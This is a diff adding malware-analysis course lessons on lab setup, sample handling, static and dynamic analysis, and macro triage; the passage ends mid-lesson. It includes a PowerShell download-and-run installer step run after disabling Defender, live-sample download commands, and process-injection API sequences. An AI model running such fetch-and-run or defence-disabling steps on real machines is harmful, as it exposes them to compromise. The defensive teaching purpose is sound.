@@ -23752,6 +23752,2152 @@ Start wherever you are and improve incrementally. Every organization can reach L
       "Build program maturity from ad-hoc (Level 1) to leading (Level 5) incrementally"
     ]
   },
+  // ==================== MALWARE ANALYSIS FUNDAMENTALS ====================
+  // Module 1: Malware Landscape & Lab Setup
+  {
+    id: "1.1",
+    courseId: "malware-analysis",
+    title: "Malware Taxonomy",
+    content: `# Malware Taxonomy
+
+Understanding malware begins with proper classification. Each category exhibits distinct behaviors, propagation methods, and objectives.
+
+## Core Malware Categories
+
+### Viruses
+Self-replicating code that attaches to legitimate programs. Requires host execution to propagate.
+
+\`\`\`
+Types:
+├── File Infectors    → Attach to .exe/.dll files
+├── Boot Sector       → Infect MBR/VBR
+├── Macro Viruses     → Embedded in Office documents
+└── Polymorphic       → Mutate code to evade signatures
+\`\`\`
+
+### Worms
+Self-propagating malware that spreads without user interaction. Exploits network vulnerabilities.
+
+**Notable Examples:**
+- **WannaCry (2017):** EternalBlue SMB exploit, ransomware payload
+- **Conficker (2008):** MS08-067, domain generation algorithm for C2
+- **Stuxnet (2010):** Multiple 0-days, targeted SCADA systems
+
+### Trojans
+Disguised as legitimate software. Categories include:
+- **RATs** (Remote Access Trojans): Provide full system control
+- **Banking Trojans**: Target financial credentials (Emotet, TrickBot)
+- **Droppers/Downloaders**: Stage additional payloads
+
+### Ransomware
+Encrypts victim data and demands payment. Modern variants use double extortion (encrypt + exfiltrate).
+
+\`\`\`
+Kill Chain:
+Initial Access → Lateral Movement → Privilege Escalation
+     → Data Exfiltration → Encryption → Ransom Note
+\`\`\`
+
+### Rootkits & Bootkits
+- **Rootkits**: Hide at kernel level, intercept system calls
+- **Bootkits**: Persist below the OS in MBR/UEFI firmware
+- Detection requires memory forensics or trusted boot verification
+
+### Wipers
+Destructive malware designed to permanently destroy data. No recovery mechanism.
+- **NotPetya**: Masqueraded as ransomware but was a wiper
+- **WhisperGate**: Multi-stage wiper targeting Ukraine (2022)
+
+## Classification by Objective
+
+| Objective | Examples | Typical Actor |
+|-----------|----------|---------------|
+| Financial Gain | Ransomware, Banking Trojans | Cybercriminals |
+| Espionage | APT implants, keyloggers | Nation-states |
+| Destruction | Wipers, logic bombs | Nation-states, hacktivists |
+| Persistence | Rootkits, bootkits | Advanced threat actors |`,
+    keyTakeaways: [
+      "Malware is classified by propagation method, payload type, and objective",
+      "Modern malware often combines multiple categories (e.g., worm + ransomware)",
+      "Understanding taxonomy helps predict behavior during analysis",
+      "Attribution often correlates with malware sophistication and objectives"
+    ]
+  },
+  {
+    id: "1.2",
+    courseId: "malware-analysis",
+    title: "Threat Actor Motivations",
+    content: `# Threat Actor Motivations
+
+Understanding who creates malware and why shapes your analysis priorities and expected sophistication.
+
+## Actor Categories
+
+### Financially Motivated (eCrime)
+The largest category by volume. Focused on monetization through:
+- **Ransomware-as-a-Service (RaaS):** LockBit, BlackCat/ALPHV, Cl0p
+- **Initial Access Brokers (IABs):** Sell compromised credentials and VPN access
+- **Business Email Compromise (BEC):** Social engineering for wire fraud
+
+\`\`\`
+RaaS Ecosystem:
+Developer → Affiliates → IABs → Victims
+    ↓           ↓          ↓
+ Malware    Operations  Access
+ Updates    & Extortion Acquisition
+\`\`\`
+
+### State-Sponsored (APT)
+Nation-state actors with significant resources:
+- **Cozy Bear (APT29):** Russian SVR, SolarWinds supply chain
+- **Lazarus Group (APT38):** North Korean, financial theft + espionage
+- **APT41 (Double Dragon):** Chinese, dual espionage and financial crime
+
+Characteristics: Custom tooling, 0-day exploits, long dwell times, operational security.
+
+### Hacktivists
+Ideologically motivated with increasing sophistication:
+- DDoS attacks and website defacements
+- Data leaks for public embarrassment
+- Wipers disguised as ransomware
+
+### Insider Threats
+Malicious or negligent insiders deploying:
+- Data exfiltration tools
+- Logic bombs triggered by termination
+- Credential harvesting from internal systems
+
+## Analysis Implications
+
+| Actor Type | Expected Sophistication | Analysis Focus |
+|------------|------------------------|----------------|
+| eCrime | Medium, commodity tools | IOCs, C2 infrastructure |
+| APT | High, custom implants | TTPs, persistence mechanisms |
+| Hacktivist | Low-Medium | Impact assessment, attribution |
+| Insider | Variable | Timeline analysis, data access |`,
+    keyTakeaways: [
+      "Actor motivation determines malware sophistication and analysis approach",
+      "RaaS has democratized ransomware, lowering the barrier to entry",
+      "APT malware requires deeper reverse engineering due to custom tooling",
+      "Attribution combines technical indicators with geopolitical context"
+    ]
+  },
+  {
+    id: "1.3",
+    courseId: "malware-analysis",
+    title: "Building a Safe Analysis Lab",
+    content: `# Building a Safe Analysis Lab
+
+A properly isolated analysis environment is critical. One misconfiguration can release malware onto your network.
+
+## Architecture Overview
+
+\`\`\`
+┌─────────────────────────────────────────┐
+│           Host Machine                  │
+│  ┌─────────────────────────────────┐    │
+│  │    Isolated Virtual Network     │    │
+│  │  ┌──────────┐  ┌──────────┐    │    │
+│  │  │ Analysis │  │ Services │    │    │
+│  │  │   VM     │←→│   VM     │    │    │
+│  │  │ (FlareVM)│  │ (REMnux) │    │    │
+│  │  └──────────┘  └──────────┘    │    │
+│  │       ↕  NO external access     │    │
+│  └─────────────────────────────────┘    │
+└─────────────────────────────────────────┘
+\`\`\`
+
+## FlareVM (Windows Analysis)
+
+FLARE VM is a Windows-based malware analysis distribution by Mandiant:
+
+\`\`\`powershell
+# Install FlareVM on a clean Windows 10 VM
+# 1. Disable Windows Defender and Updates
+# 2. Take a clean snapshot
+# 3. Run installer:
+(New-Object net.webclient).DownloadFile(
+  'https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',
+  "$env:TEMP\\install.ps1"
+)
+Unblock-File "$env:TEMP\\install.ps1"
+Set-ExecutionPolicy Unrestricted -Force
+& "$env:TEMP\\install.ps1" -password MalwareLab1!
+\`\`\`
+
+Key tools installed: x64dbg, Ghidra, PE-bear, FLOSS, PEiD, Process Monitor, Wireshark.
+
+## REMnux (Linux Services)
+
+REMnux provides network simulation and analysis services:
+
+\`\`\`bash
+# Services to run on REMnux:
+inetsim          # Simulate DNS, HTTP, SMTP, FTP
+fakedns          # Respond to all DNS queries
+remnux-cli       # Manage analysis tools
+\`\`\`
+
+## Network Isolation Rules
+
+1. **Host-only networking** — VMs communicate only with each other
+2. **No NAT/bridged** — Never give malware internet access
+3. **INetSim on REMnux** — Fake responses satisfy malware network checks
+4. **Snapshot before execution** — Always revert after analysis
+
+## Snapshot Strategy
+
+\`\`\`
+Clean Install → Base Snapshot → Tool Install → Analysis Snapshot
+                                    ↑
+                              Revert here after
+                              each analysis session
+\`\`\``,
+    keyTakeaways: [
+      "Always use host-only networking to prevent malware from reaching the internet",
+      "FlareVM provides a comprehensive Windows analysis toolkit",
+      "REMnux simulates network services so malware behaves naturally",
+      "Snapshot before every execution and revert after every analysis session"
+    ]
+  },
+  {
+    id: "1.4",
+    courseId: "malware-analysis",
+    title: "Sample Acquisition & Handling",
+    content: `# Sample Acquisition & Handling
+
+Obtaining malware samples safely and maintaining proper chain of custody is essential for professional analysis.
+
+## Sample Sources
+
+### MalwareBazaar (abuse.ch)
+Free, community-driven malware sample repository:
+\`\`\`bash
+# Download by SHA256 hash
+curl -X POST https://mb-api.abuse.ch/api/v1/ \\
+  -d "query=get_file&sha256_hash=<HASH>" \\
+  -o sample.zip
+# Password: infected
+\`\`\`
+
+### VirusTotal
+Intelligence platform with sample download (requires API key):
+\`\`\`python
+import vt
+client = vt.Client("<API_KEY>")
+with open("sample.bin", "wb") as f:
+    client.download_file("<SHA256>", f)
+\`\`\`
+
+### Other Sources
+- **Malware Traffic Analysis** (malware-traffic-analysis.net): PCAPs + samples
+- **TheZoo**: Curated live malware repository on GitHub
+- **ANY.RUN**: Public submissions with downloadable samples
+- **Hybrid Analysis**: Free sandbox with sample downloads
+
+## Safe Handling Procedures
+
+### File Naming Convention
+\`\`\`
+[DATE]_[MALWARE_FAMILY]_[SHA256_SHORT].[ext].malz
+Example: 2024-01-15_emotet_a3b2c1d4.dll.malz
+\`\`\`
+
+### Transfer Protocol
+1. Always use password-protected ZIP (password: "infected")
+2. Rename extensions to prevent accidental execution (.malz, .vir)
+3. Transfer only through isolated channels (never email without encryption)
+4. Store on encrypted volumes (VeraCrypt or BitLocker)
+
+### Chain of Custody
+\`\`\`
+Document for each sample:
+├── Source (URL, email attachment, memory dump)
+├── Acquisition timestamp (UTC)
+├── Handler identity
+├── Hash values (MD5, SHA1, SHA256)
+├── Original filename and path
+└── Analysis actions performed
+\`\`\`
+
+## Hash Verification
+
+\`\`\`bash
+# Always verify sample integrity
+sha256sum sample.bin
+md5sum sample.bin
+
+# Check against VirusTotal
+vt file <SHA256> --include=last_analysis_stats
+\`\`\``,
+    keyTakeaways: [
+      "MalwareBazaar and VirusTotal are primary sources for malware samples",
+      "Always use password-protected archives and renamed extensions",
+      "Maintain chain of custody documentation for every sample",
+      "Verify hashes before and after transfer to ensure integrity"
+    ]
+  },
+  // Module 2: Static Analysis Techniques
+  {
+    id: "2.1",
+    courseId: "malware-analysis",
+    title: "File Identification & Hashing",
+    content: `# File Identification & Hashing
+
+The first step in any analysis is determining exactly what you're dealing with, regardless of the file extension.
+
+## File Type Identification
+
+### Magic Bytes
+Every file format has signature bytes at specific offsets:
+\`\`\`bash
+# Linux file command reads magic bytes
+file sample.bin
+# Output: PE32+ executable (DLL) (GUI) x86-64, for MS Windows
+
+# Check magic bytes manually
+xxd sample.bin | head -5
+# 4d5a = MZ header (PE executable)
+# 504b = PK header (ZIP/Office)
+# d0cf = OLE header (Legacy Office)
+# 25504446 = %PDF
+\`\`\`
+
+### TrID
+Advanced file identification using binary patterns:
+\`\`\`bash
+trid sample.bin
+# 67.7% (.DLL) Win32 Dynamic Link Library
+# 32.3% (.EXE) Win32 Executable
+\`\`\`
+
+## Cryptographic Hashing
+
+### Standard Hashes
+\`\`\`bash
+md5sum sample.bin     # Fast but collision-prone (legacy use)
+sha1sum sample.bin    # Deprecated but still used in some DBs
+sha256sum sample.bin  # Industry standard for identification
+\`\`\`
+
+### Fuzzy Hashing (ssdeep)
+Identifies similar files even with minor modifications:
+\`\`\`bash
+ssdeep sample_v1.bin > hash1.txt
+ssdeep -m hash1.txt sample_v2.bin
+# Match: 95% — likely same family with minor changes
+\`\`\`
+
+### Import Hash (imphash)
+Hash of imported functions — identical for samples from the same builder:
+\`\`\`python
+import pefile
+pe = pefile.PE("sample.exe")
+print(pe.get_imphash())
+# Samples from the same malware kit share imphash values
+\`\`\`
+
+### Rich Header Hash
+PE Rich header identifies the build environment:
+\`\`\`python
+import pefile
+pe = pefile.PE("sample.exe")
+print(pe.get_rich_header_hash())
+# Links samples compiled with the same toolchain
+\`\`\`
+
+## Practical Workflow
+
+\`\`\`
+1. file command → Determine true file type
+2. sha256sum   → Generate unique identifier
+3. VT lookup   → Check existing detections
+4. ssdeep      → Find related samples
+5. imphash     → Link to malware families
+\`\`\``,
+    keyTakeaways: [
+      "Never trust file extensions — always verify with magic bytes",
+      "SHA256 is the standard for unique sample identification",
+      "Fuzzy hashing (ssdeep) finds variants of the same malware family",
+      "Import hashing links samples built with the same toolkit"
+    ]
+  },
+  {
+    id: "2.2",
+    courseId: "malware-analysis",
+    title: "String Extraction & Analysis",
+    content: `# String Extraction & Analysis
+
+Strings embedded in malware reveal URLs, file paths, registry keys, error messages, and C2 addresses — often the fastest path to understanding behavior.
+
+## Basic String Extraction
+
+### Linux strings Command
+\`\`\`bash
+# ASCII strings (minimum 6 characters)
+strings -n 6 sample.exe
+
+# Unicode (UTF-16LE, common in Windows malware)
+strings -el sample.exe
+
+# Combine and sort unique
+strings -n 6 sample.exe | sort -u > strings_ascii.txt
+strings -el sample.exe | sort -u > strings_unicode.txt
+\`\`\`
+
+## FLOSS (FireEye Labs Obfuscated String Solver)
+
+FLOSS automatically deobfuscates strings that basic extraction misses:
+\`\`\`bash
+floss sample.exe
+
+# Output categories:
+# FLOSS STATIC STRINGS    → Standard extracted strings
+# FLOSS DECODED STRINGS   → Runtime-decoded strings
+# FLOSS STACK STRINGS     → Strings built on the stack
+\`\`\`
+
+## What to Look For
+
+### Network Indicators
+\`\`\`
+URLs:        http://, https://, hxxp://
+IP Addresses: \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}
+Domains:     .com, .net, .xyz, .onion
+User-Agents: Mozilla/5.0, curl/
+\`\`\`
+
+### System Artifacts
+\`\`\`
+Registry:    HKLM\\, HKCU\\, CurrentVersion\\Run
+File Paths:  C:\\Windows\\, %TEMP%\\, %APPDATA%\\
+Processes:   cmd.exe, powershell.exe, schtasks.exe
+Services:    CreateServiceA, StartServiceA
+\`\`\`
+
+### Crypto & Encoding
+\`\`\`
+Base64:      Long alphanumeric strings with = padding
+XOR keys:    Short repeating byte sequences
+AES/RC4:     CryptEncrypt, CryptDecrypt API names
+\`\`\`
+
+## Grep Patterns for Triage
+
+\`\`\`bash
+# Extract URLs
+grep -oP 'https?://[^\\s"]+' strings.txt
+
+# Find IP addresses
+grep -oP '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' strings.txt
+
+# Registry persistence
+grep -i 'currentversion\\\\run' strings.txt
+
+# Base64 encoded content
+grep -oP '[A-Za-z0-9+/]{40,}={0,2}' strings.txt
+\`\`\``,
+    keyTakeaways: [
+      "Always extract both ASCII and Unicode strings from PE files",
+      "FLOSS recovers obfuscated strings that basic tools miss",
+      "Network IOCs in strings often reveal C2 infrastructure",
+      "Registry and file path strings indicate persistence mechanisms"
+    ]
+  },
+  {
+    id: "2.3",
+    courseId: "malware-analysis",
+    title: "PE Header Deep Dive",
+    content: `# PE Header Deep Dive
+
+The Portable Executable (PE) format is the standard for Windows executables. Its headers contain metadata critical for malware analysis.
+
+## PE Structure Overview
+
+\`\`\`
+┌──────────────────┐
+│   DOS Header     │  MZ signature, e_lfanew pointer
+├──────────────────┤
+│   PE Signature   │  "PE\\0\\0"
+├──────────────────┤
+│   COFF Header    │  Machine type, number of sections, timestamp
+├──────────────────┤
+│  Optional Header │  Entry point, image base, subsystem
+├──────────────────┤
+│  Section Headers │  .text, .data, .rsrc, .reloc
+├──────────────────┤
+│  Import Table    │  DLLs and functions imported
+├──────────────────┤
+│  Export Table    │  Functions exported (DLLs)
+├──────────────────┤
+│  Resources      │  Icons, strings, embedded files
+└──────────────────┘
+\`\`\`
+
+## Key Analysis with pefile
+
+\`\`\`python
+import pefile
+pe = pefile.PE("sample.exe")
+
+# Compilation timestamp
+from datetime import datetime
+ts = pe.FILE_HEADER.TimeDateStamp
+print(f"Compiled: {datetime.utcfromtimestamp(ts)}")
+# Suspicious: future dates, epoch 0, or very old timestamps
+
+# Entry point
+ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
+print(f"Entry Point: 0x{ep:08x}")
+
+# Sections analysis
+for section in pe.sections:
+    name = section.Name.decode().rstrip('\\x00')
+    entropy = section.get_entropy()
+    print(f"{name}: size={section.SizeOfRawData}, entropy={entropy:.2f}")
+    # High entropy (>7.0) suggests encryption/packing
+\`\`\`
+
+## Import Table Analysis
+
+Imports reveal what the malware is capable of:
+
+\`\`\`
+Suspicious Import Groups:
+├── Process Injection: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
+├── Keylogging: SetWindowsHookEx, GetAsyncKeyState
+├── File Operations: CreateFileA, WriteFile, DeleteFileA
+├── Registry: RegSetValueEx, RegCreateKeyEx
+├── Networking: InternetOpenA, HttpSendRequest, WSAStartup
+├── Anti-Debug: IsDebuggerPresent, CheckRemoteDebuggerPresent
+└── Crypto: CryptEncrypt, CryptDecrypt, CryptHashData
+\`\`\`
+
+## Red Flags in PE Headers
+
+| Indicator | Significance |
+|-----------|-------------|
+| Few/no imports | Likely packed or dynamically resolves APIs |
+| Section name anomalies | UPX0, .ndata → known packers |
+| Entry point in non-.text section | Possible packing or injection |
+| Raw size = 0 for sections | Section unpacked at runtime |
+| Mismatched timestamps | Timestomping or compilation anomaly |`,
+    keyTakeaways: [
+      "PE headers reveal compilation time, capabilities, and packing status",
+      "Import tables directly indicate malware functionality",
+      "High entropy sections suggest encrypted or packed content",
+      "Anomalous section names and entry points are packing indicators"
+    ]
+  },
+  {
+    id: "2.4",
+    courseId: "malware-analysis",
+    title: "Packing & Obfuscation Detection",
+    content: `# Packing & Obfuscation Detection
+
+Packers compress or encrypt executables to evade signature-based detection. Identifying and unpacking is essential before deeper analysis.
+
+## How Packers Work
+
+\`\`\`
+Original Binary → Packer → Packed Binary
+                              │
+                    ┌─────────┴─────────┐
+                    │  Packed Stub       │
+                    │  ┌──────────────┐  │
+                    │  │ Decompressor │  │
+                    │  │    Code      │  │
+                    │  └──────┬───────┘  │
+                    │         ↓          │
+                    │  ┌──────────────┐  │
+                    │  │  Compressed  │  │
+                    │  │  Original    │  │
+                    │  │  Code        │  │
+                    │  └──────────────┘  │
+                    └────────────────────┘
+At runtime: Stub decompresses → Original code runs in memory
+\`\`\`
+
+## Detection Methods
+
+### Entropy Analysis
+\`\`\`python
+import pefile
+import math
+
+pe = pefile.PE("sample.exe")
+for section in pe.sections:
+    entropy = section.get_entropy()
+    name = section.Name.decode().rstrip('\\x00')
+    status = "PACKED" if entropy > 7.0 else "normal"
+    print(f"{name}: entropy={entropy:.2f} [{status}]")
+
+# Unpacked: .text ~6.0, .data ~4.0, .rsrc ~3.5
+# Packed: Most sections >7.0 (near random)
+\`\`\`
+
+### Detect It Easy (DiE)
+\`\`\`bash
+diec sample.exe
+# Output: UPX(3.96)[NRV,brute]
+# Identifies: UPX, Themida, VMProtect, ASPack, MPRESS, etc.
+\`\`\`
+
+### Visual Indicators
+- Very few imports (only LoadLibrary/GetProcAddress)
+- Large sections with high entropy
+- Section names like UPX0, UPX1, .ndata, .vmp
+- Small code section with large data section
+
+## Common Packers
+
+| Packer | Detection | Unpacking |
+|--------|-----------|-----------|
+| UPX | "UPX!" string in headers | \`upx -d sample.exe\` |
+| Themida | .vmp sections, anti-debug | Manual debugging required |
+| ASPack | .adata, .aspack sections | OllyDbg/x64dbg OEP finding |
+| MPRESS | .MPRESS sections | Modified UPX unpacker |
+| Custom | No known signatures | Dynamic analysis + dumping |
+
+## Manual Unpacking with x64dbg
+
+\`\`\`
+Strategy: Find Original Entry Point (OEP)
+1. Set breakpoint on VirtualAlloc/VirtualProtect
+2. Run until memory is allocated
+3. Follow allocated memory in dump
+4. Wait for decompression to complete
+5. Set hardware breakpoint on first bytes
+6. Dump process memory at OEP
+7. Fix imports with Scylla plugin
+\`\`\``,
+    keyTakeaways: [
+      "Packers hide original code by compressing/encrypting the binary",
+      "Entropy >7.0 strongly indicates packed or encrypted content",
+      "UPX is trivially unpacked; custom packers require manual debugging",
+      "Detect It Easy identifies most common packers automatically"
+    ]
+  },
+  // Module 3: Dynamic & Behavioral Analysis
+  {
+    id: "3.1",
+    courseId: "malware-analysis",
+    title: "Sandbox Fundamentals",
+    content: `# Sandbox Fundamentals
+
+Sandboxes execute malware in a controlled environment, automatically capturing behavioral artifacts for analysis.
+
+## Sandbox Types
+
+### Cloud Sandboxes
+- **ANY.RUN**: Interactive, real-time observation, free tier available
+- **Joe Sandbox**: Deep analysis, multi-platform (Windows, macOS, Android)
+- **Hybrid Analysis**: CrowdStrike-powered, free community edition
+- **VirusTotal Sandbox**: Integrated with VT intelligence
+
+### Self-Hosted Sandboxes
+- **Cuckoo Sandbox**: Open-source, highly customizable
+- **CAPE Sandbox**: Fork of Cuckoo with enhanced unpacking and config extraction
+
+## ANY.RUN Workflow
+
+\`\`\`
+1. Upload sample or submit URL
+2. Select environment (Win 7/10/11, 32/64-bit)
+3. Choose interaction mode:
+   - Automatic: Runs without intervention
+   - Interactive: Click through installers, dialogs
+4. Observe in real-time:
+   - Process tree
+   - Network connections
+   - File system changes
+   - Registry modifications
+5. Download report with IOCs
+\`\`\`
+
+## Cuckoo Sandbox Setup
+
+\`\`\`bash
+# Architecture
+Host (Ubuntu) → KVM/VirtualBox → Analysis VMs (Windows)
+     ↓
+ Cuckoo Core
+     ├── Scheduler
+     ├── Analysis Manager
+     ├── Result Processing
+     └── Web Interface
+
+# Submit sample
+cuckoo submit sample.exe --timeout 120 --options "human=1"
+\`\`\`
+
+## Sandbox Evasion Techniques
+
+Malware detects sandboxes through:
+
+| Technique | Detection Method | Sandbox Counter |
+|-----------|-----------------|-----------------|
+| VM detection | Registry keys, MAC addresses | Custom VM configs |
+| Time-based | Sleep calls, tick counts | Time acceleration |
+| User activity | Mouse movement, clicks | Input simulation |
+| Environment | Username, hostname, CPU count | Realistic profiles |
+| File system | Recent documents, browser history | Pre-populated files |
+
+## Interpreting Results
+
+Focus on these behavioral categories:
+\`\`\`
+Process Activity:  Child processes, injection, privilege escalation
+File System:       Dropped files, modified system files, encryption
+Registry:          Persistence keys (Run, Services, Tasks)
+Network:           DNS queries, HTTP/HTTPS C2, data exfiltration
+\`\`\``,
+    keyTakeaways: [
+      "Cloud sandboxes provide quick triage without infrastructure setup",
+      "ANY.RUN's interactive mode handles malware requiring user clicks",
+      "Sophisticated malware actively detects and evades sandboxes",
+      "Focus on process trees, network activity, and persistence indicators"
+    ]
+  },
+  {
+    id: "3.2",
+    courseId: "malware-analysis",
+    title: "Process & Registry Monitoring",
+    content: `# Process & Registry Monitoring
+
+Runtime monitoring captures every file, registry, and process action malware performs — revealing its true intent.
+
+## Process Monitor (ProcMon)
+
+Sysinternals ProcMon captures real-time filesystem, registry, and process activity:
+
+\`\`\`
+Essential Filters:
+├── Process Name is sample.exe → Include
+├── Operation is CreateFile  → Include
+├── Operation is RegSetValue → Include
+├── Operation is Process Create → Include
+├── Path contains \\Run\\ → Include (persistence)
+└── Result is ACCESS DENIED → Include (privilege issues)
+\`\`\`
+
+### Key Operations to Watch
+
+\`\`\`
+File System:
+  CreateFile    → Files opened/created
+  WriteFile     → Data written (payloads dropped)
+  DeleteFile    → Self-deletion or evidence cleanup
+  SetDispositionInformationFile → Mark for delete on close
+
+Registry:
+  RegSetValue   → Configuration or persistence
+  RegCreateKey  → New registry keys
+  RegDeleteValue → Covering tracks
+
+Process:
+  Process Create → Child processes spawned
+  Thread Create  → Remote thread injection
+  Load Image     → DLLs loaded
+\`\`\`
+
+## Process Hacker
+
+Advanced process manager revealing:
+- Full process tree with parent-child relationships
+- Memory regions (RWX permissions = suspicious)
+- Network connections per process
+- Thread start addresses (detect injection)
+- Token and privilege information
+
+\`\`\`
+Suspicious Indicators:
+├── svchost.exe spawned by non-services.exe parent
+├── Process with RWX memory regions
+├── cmd.exe/powershell.exe child of Office application
+├── Process with no visible window but network activity
+└── Thread start address outside any loaded module
+\`\`\`
+
+## Regshot
+
+Captures registry snapshots before and after execution:
+\`\`\`
+1. Take Snapshot #1 (clean state)
+2. Execute malware
+3. Wait for activity to complete
+4. Take Snapshot #2
+5. Compare → Shows all registry changes
+
+Output:
+Keys Added:   HKLM\\SYSTEM\\CurrentControlSet\\Services\\MalSvc
+Values Added: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update
+Values Modified: HKLM\\SOFTWARE\\Policies\\...
+\`\`\``,
+    keyTakeaways: [
+      "ProcMon filters are essential — unfiltered output is overwhelming",
+      "Watch for child process creation, especially from Office or script hosts",
+      "RWX memory regions in Process Hacker indicate code injection",
+      "Regshot diffs reveal persistence and configuration changes"
+    ]
+  },
+  {
+    id: "3.3",
+    courseId: "malware-analysis",
+    title: "Network Traffic Capture",
+    content: `# Network Traffic Capture
+
+Capturing malware network communications reveals C2 servers, data exfiltration, and payload downloads.
+
+## FakeNet-NG
+
+Windows-based network simulation that intercepts and redirects all traffic:
+\`\`\`
+FakeNet-NG simulates:
+├── DNS → Responds to all queries
+├── HTTP/HTTPS → Captures requests, serves fake pages
+├── SMTP → Captures email sending attempts
+├── FTP → Logs file transfers
+├── IRC → Captures bot commands
+└── Raw TCP/UDP → Logs custom protocol data
+\`\`\`
+
+\`\`\`bash
+# Run FakeNet-NG
+fakenet
+
+# All DNS queries resolve to localhost
+# All HTTP requests get generic responses
+# Malware thinks it has internet connectivity
+\`\`\`
+
+## INetSim (on REMnux)
+
+Linux-based internet simulation for the analysis VM:
+\`\`\`bash
+# Start all simulated services
+inetsim --config /etc/inetsim/inetsim.conf
+
+# Serves on ports: 53(DNS), 80(HTTP), 443(HTTPS),
+# 25(SMTP), 110(POP3), 143(IMAP), 21(FTP)
+
+# Downloaded files saved to:
+/var/lib/inetsim/report/
+\`\`\`
+
+## Wireshark Analysis
+
+\`\`\`
+Key Display Filters for Malware:
+├── dns → All DNS queries (look for DGA domains)
+├── http.request → HTTP requests to C2
+├── tls.handshake → TLS connections (check SNI)
+├── tcp.flags.syn==1 && tcp.flags.ack==0 → Connection attempts
+├── data.len > 0 → Frames with payload data
+└── ip.dst != 10.0.0.0/8 → External connections
+\`\`\`
+
+### C2 Communication Patterns
+
+\`\`\`
+Beaconing:
+  Regular intervals (e.g., every 60s) with jitter
+  → Filter: tcp.stream eq X → Follow Stream
+
+Data Exfiltration:
+  Large outbound transfers, often chunked
+  → Statistics → Conversations → Sort by Bytes
+
+DNS Tunneling:
+  Long subdomain queries encoding data
+  → dns.qry.name.len > 50
+
+Domain Generation Algorithm (DGA):
+  Random-looking domain names
+  → dns && dns.flags.response == 0
+\`\`\``,
+    keyTakeaways: [
+      "FakeNet-NG and INetSim provide safe internet simulation for malware",
+      "DNS queries often reveal C2 domains and DGA patterns",
+      "Wireshark display filters help isolate malicious traffic from noise",
+      "Beaconing patterns reveal C2 check-in intervals and jitter"
+    ]
+  },
+  {
+    id: "3.4",
+    courseId: "malware-analysis",
+    title: "API Call Tracing",
+    content: `# API Call Tracing
+
+Windows malware operates through Win32 API calls. Tracing these calls reveals exact system interactions.
+
+## Win32 API Categories
+
+\`\`\`
+Critical APIs for Malware Analysis:
+│
+├── Process Manipulation
+│   ├── CreateProcess(A/W)     → Launch new process
+│   ├── OpenProcess             → Get handle to running process
+│   ├── VirtualAllocEx          → Allocate memory in another process
+│   ├── WriteProcessMemory      → Write into another process
+│   └── CreateRemoteThread      → Execute code in another process
+│
+├── File Operations
+│   ├── CreateFile(A/W)         → Open/create files
+│   ├── ReadFile / WriteFile    → File I/O
+│   ├── DeleteFile              → Remove files
+│   └── MoveFile                → Rename/move files
+│
+├── Registry
+│   ├── RegOpenKeyEx            → Open registry key
+│   ├── RegSetValueEx           → Write registry value
+│   └── RegDeleteValue          → Remove registry value
+│
+├── Networking
+│   ├── InternetOpen(A/W)       → Initialize WinINet
+│   ├── InternetConnect         → Connect to server
+│   ├── HttpSendRequest         → Send HTTP request
+│   ├── WSAStartup              → Initialize Winsock
+│   └── connect / send / recv   → Raw socket operations
+│
+└── Anti-Analysis
+    ├── IsDebuggerPresent       → Check for debugger
+    ├── GetTickCount            → Timing check
+    ├── NtQueryInformationProcess → Advanced debugger detection
+    └── Sleep                   → Delay execution
+\`\`\`
+
+## API Monitor
+
+Graphical tool for selective API monitoring:
+\`\`\`
+Setup:
+1. Select API categories to monitor
+2. Launch process or attach to running
+3. Filter by module (kernel32, ntdll, ws2_32)
+4. View call parameters and return values
+
+Useful filters:
+- Data Access and Storage → File operations
+- Internet Functions → Network activity
+- System Services → Process/thread creation
+\`\`\`
+
+## x64dbg API Breakpoints
+
+\`\`\`
+# Set breakpoints on key APIs
+bp CreateFileW        ; File creation
+bp RegSetValueExW     ; Registry writes
+bp InternetConnectW   ; Network connections
+bp VirtualAllocEx     ; Memory allocation in remote process
+bp CreateRemoteThread ; Code injection
+
+# Log without breaking
+SetBreakpointCondition CreateFileW, 0
+SetBreakpointLog CreateFileW, "CreateFile: {s:arg2}"
+\`\`\`
+
+## API Call Sequences
+
+\`\`\`
+Process Injection (Classic):
+  OpenProcess → VirtualAllocEx → WriteProcessMemory
+  → CreateRemoteThread
+
+Process Hollowing:
+  CreateProcess(SUSPENDED) → NtUnmapViewOfSection
+  → VirtualAllocEx → WriteProcessMemory → ResumeThread
+
+Keylogging:
+  SetWindowsHookEx(WH_KEYBOARD_LL) → GetMessage loop
+\`\`\``,
+    keyTakeaways: [
+      "Win32 API calls directly reveal malware capabilities and intent",
+      "Process injection follows recognizable API call sequences",
+      "API Monitor provides graphical filtering for targeted monitoring",
+      "x64dbg conditional breakpoints enable logging without stopping execution"
+    ]
+  },
+  // Module 4: Document & Script Malware
+  {
+    id: "4.1",
+    courseId: "malware-analysis",
+    title: "Office Macro Analysis",
+    content: `# Office Macro Analysis
+
+Malicious Office documents remain a top initial access vector. VBA macros execute code when documents are opened.
+
+## Initial Triage
+
+\`\`\`bash
+# Check for macros with olevba
+olevba malicious.docm
+
+# Output sections:
+# VBA MACRO ANALYSIS
+# AutoExec: Auto_Open, Document_Open, Workbook_Open
+# Suspicious: Shell, CreateObject, PowerShell, WScript
+# IOCs: URLs, IPs, file paths
+# Hex Strings: Possible encoded payloads
+\`\`\`
+
+## Oletools Suite
+
+\`\`\`bash
+# oleid — identify file type and macro presence
+oleid document.docm
+
+# olevba — extract and analyze VBA macros
+olevba --deobf document.docm    # Attempt deobfuscation
+olevba --reveal document.docm   # Show hidden content
+
+# oledump — analyze OLE streams
+oledump.py document.doc
+# Look for streams with 'M' (Macro) or 'm' (macro) indicator
+oledump.py -s 7 -v document.doc  # Dump specific stream
+
+# rtfobj — extract embedded objects from RTF
+rtfobj malicious.rtf
+\`\`\`
+
+## Common Macro Patterns
+
+### Auto-Execution Triggers
+\`\`\`vba
+Sub AutoOpen()         ' Word auto-execute
+Sub Document_Open()    ' Word document open
+Sub Auto_Open()        ' Excel auto-execute
+Sub Workbook_Open()    ' Excel workbook open
+\`\`\`
+
+### Obfuscation Techniques
+\`\`\`vba
+' String concatenation
+cmd = "pow" & "er" & "she" & "ll"
+
+' Chr() encoding
